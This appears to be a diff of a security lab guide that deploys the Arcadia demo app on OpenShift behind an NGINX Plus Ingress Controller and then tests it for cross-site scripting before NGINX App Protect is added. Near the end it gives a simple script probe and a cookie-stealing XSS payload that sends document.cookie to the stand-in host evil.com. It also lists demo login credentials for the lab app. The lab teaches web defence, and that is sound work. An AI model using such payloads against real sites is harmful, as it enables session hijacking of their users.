@@ -2,42 +2,39 @@ Access Arcadia app without NGINX App Protect
 ------------------------------------------------
 
 
-Publish Arcadia app with NGINX Plus Ingress Controller
+Deploy the Arcadia Application into Kubernetes
 #######################################################
 
 .. note::  The Arcadia Financial application is the same application we introduced in Module 1, but a different version with enhanced features which will be used for our security lab exercises.
 
-1. Deploy the Arcadia Application into Kubernetes
 
-   The Arcadia Application deployment is a single manifest file containing the resources need to build.
+   Before we can access the Arcadia application, we need to deploy it into our Kubernetes cluster. To do this, we'll use a single manifest file that contains the necessary resources, such as Kubernetes deployments for the four Docker containers and Kubernetes services for the four Docker containers.
 
-   - Kubernetes deployment for the four docker containers
-   - Kubernetes services for the four docker containers
-
-   Get the yaml file. In the terminal window, copy the below text and paste+enter:
+   To get the YAML file, we'll use the following command in our terminal window:
 
    .. code-block:: bash
 
     wget https://raw.githubusercontent.com/ericzji/nginx-openshift-lab/main/docs/class1/module2/templates/arcadia-all.yaml
 
-   Apply the updated yaml file. In the terminal window, copy the below text and paste+enter:
+   Once we have the YAML file, we can apply it to our Kubernetes cluster with the following command:
 
    .. code-block:: bash
 
       oc apply -f ./arcadia-all.yaml
 
 
-2. Arcadia application Kubernetes objects
-
-   In the terminal window, copy the below text and paste+enter:
+   We can check that our Arcadia application is running by using the following command in our terminal window:
 
    .. code-block:: bash
 
       oc get services
 
+   This will show us the services running in our Kubernetes cluster, including those related to the Arcadia application.
+
    Example:
 
-3.  Export the NGINX Ingress Controller services
+Export the NGINX Ingress Controller services
+#######################################################
 
     Interacting with the NGINX Ingress Controller is more comfortable with exporting the service External IPs into system variables. This allows for templating to take place when we expose our applications.
 
@@ -52,55 +49,55 @@ Publish Arcadia app with NGINX Plus Ingress Controller
        export nginx_ingress=$(oc get svc my-nginx-ingress-controller-nginx-ingress --namespace=nginx-ingress | tr -s " " | cut -d' ' -f4 | grep -v "EXTERNAL-IP")
 
 
-4. Publish Arcadia app with NGINX Plus Ingress Controller
+Publish Arcadia app with NGINX Plus Ingress Controller
+########################################################
 
-   Re-create NGINX Ingress Controller with Basic HTTP:
-
-   In the terminal window, copy the below text and paste+enter:
+   Now that we have our Arcadia application deployed in our Kubernetes cluster, we need to publish it using the NGINX Plus Ingress Controller. We'll do this by re-creating the NGINX Ingress Controller with Basic HTTP using the following command in our terminal window:
 
    .. literalinclude :: templates/ingress-arcadia.yml
       :language: yaml
 
+   This command creates a VirtualServer resource for our Arcadia application, which includes the host for the NGINX Ingress Controller and the upstreams for the different microservices. We can now access our Arcadia application externally using the NGINX Ingress Controller URL, which can be found by running the following command in our terminal window:
+
+       .. code-block:: bash
+
+         echo "NGINX Ingress Controller URL: http://$nginx_ingress/"
+
+   Once we have the URL, we can access our Arcadia application by opening it in a web browser.
 
 
-Access the Arcadia application
-#################################
-Arcadia application is now exposed through the NGINX Ingress Controller on HTTP!
+   You should be presented with the Main page, click on Login and enter the credentials as below.
 
-NGINX Ingress Controller URL (replace with the nginx-ingress EXTERNAL-IP): http://EXTERNAL-IP/
+   .. code-block:: 
 
-You should be presented with the Main page, click on Login and enter the credentials as below.
+      Username: matt
+      Password: ilovef5
 
-.. code-block:: 
-
-    Username: matt
-    Password: ilovef5
-
-When you click on Log me in, you should be presented with Arcadia application that consist of four microservices
+   When you click on Log me in, you should be presented with Arcadia application that consist of four microservices
 
 
-.. image:: ./pictures/image10.png
-   :align: center
+   .. image:: ./pictures/image10.png
+      :align: center
 
-Congratulations!
+   Congratulations!
 
-You have now successfully deployed the application in K8s cluster and published it externally using the NGINX Plus Ingress controller
+   You have now successfully deployed the application in K8s cluster and published it externally using the NGINX Plus Ingress controller
 
 
 Is our application protected against Layer 7 attacks?
 ######################################################
  
-We deployed and published the application, but is our application protected against web application attacks? Let's find out by executing a simple XSS attack. XSS is one of the well know OWASP top 10 attack.
+Before we can protect our Arcadia application with NGINX App Protect, we need to check if it's currently vulnerable to Layer 7 attacks. We can do this by executing a simple XSS attack, which is a well-known OWASP top 10 attack.
 
-- Launch the Firefox browser and execute a XSS attack by appending the ``?a=<script>`` to the end of application URL, you should see the request is allowed.
+To perform the XSS attack, we can launch the Firefox browser and append ``?a=<script>`` to the end of the application URL. If the request is allowed, then our application is vulnerable to XSS attacks.
 
 .. image:: ./pictures/image11.png
    :align: center
 
-- Execute another attack by appending ``?item='><script>document.location='http://evil.com/steal'+document.cookie</script>`` to the application URL, this request is also allowed and a bad actor has successfully stealed your document cookie by luring you to his website.
+We can further test this by appending ``?item='><script>document.location='http://evil.com/steal'+document.cookie</script>`` to the application URL, which will attempt to steal our document cookie. If this request is also allowed, then a bad actor could potentially steal sensitive information from our application user
 
 .. image:: ./pictures/image12.png
    :align: center
 
-Now that we know our application is vulnerable to Layer 7 attacks, we will address this in this Lab and protect our application using NGINX App Protect (NAP)
+Since our application is currently vulnerable to Layer 7 attacks, we'll need to protect it using NGINX App Protect in the following Lab.
 
